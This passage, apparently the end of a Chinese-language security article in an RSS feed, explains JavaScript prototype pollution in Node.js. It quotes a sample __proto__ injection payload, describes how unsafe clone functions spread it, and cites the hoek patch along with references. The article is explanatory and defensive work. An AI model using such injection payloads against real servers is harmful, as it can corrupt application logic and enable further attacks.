-&lt;li&gt;攻击者发送的字符串 &lt;code&gt;{&amp;quot;__proto__&amp;quot;:{&amp;quot;oops&amp;quot;:&amp;quot;It works !&amp;quot;}}&lt;/code&gt; 在被服务端调用 JSON.parse 解析后得到 obj1，但 obj1 的原型是安全的，此时 &lt;code&gt;__proto__&lt;/code&gt; 仅仅是 obj1 的一个普通的自有属性&lt;/li&gt;
-&lt;li&gt;服务端调用 clone 或类似具有风险的函数，得到了新的对象 obj2，此时 obj2 的原型已经被污染，指向了攻击者注入的属性 &lt;code&gt;{&amp;quot;oops&amp;quot;:&amp;quot;It works !&amp;quot;}&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;服务端调用新的对象 obj2时，触发可能的危险操作&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;对该攻击的防御也很简单，在赋值操作时注意危险的 &lt;code&gt;__proto__&lt;/code&gt; 属性即可。&lt;/p&gt;
-
-&lt;p&gt;举例说明，下图是 npm 上的库 hoek 在 prototype pollution attack 发生后提交的 patch，可以看到只要简单的过滤即可防御该攻击：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20180925143329-ea8cb334-c08c-1.png&#34; alt=&#34;Patch&#34; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&#34;参考链接&#34;&gt;参考链接&lt;/h2&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;https://dinhbaoluciusteam.wordpress.com/2018/09/23/defcamp-dctf-2018-chat/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Defcamp (DCTF) 2018 – Chat&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Prototype pollution attack in NodeJS application&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://hackerone.com/reports/310439&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Prototype pollution attack (Hoek)&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Object - MDN 文档&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://www.cnblogs.com/shuiyi/p/5305435.html&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;三张图搞懂JavaScript的原型对象与原型链&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 </description>
     </item>
